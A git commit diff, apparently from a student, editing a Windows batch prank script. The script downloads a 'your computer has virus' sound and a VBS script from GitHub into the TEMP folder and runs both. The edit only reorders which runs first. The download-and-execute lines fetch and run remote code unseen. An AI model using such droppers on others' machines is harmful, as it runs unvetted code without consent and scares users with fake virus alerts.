8862003e483d30932d7e40383ca385292ae2168c
YourMatto <124151@leerling.delagewaard.nl>
2022-10-17 18:11:48 +0200

    Update sound.bat

--- sound.bat
+++ sound.bat
@@ -1,5 +1,5 @@
 cd %TEMP%
 Powershell -Command "Invoke-WebRequest 'https://www.myinstants.com/media/sounds/hello-your-computer-has-virus-sound-effect.mp3' -OutFile haha.mp3"
 Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/YourMatto/BiebBoeb/main/sound.vbs' -OutFile iets.vbs"
-iets.vbs
 haha.mp3
+iets.vbs
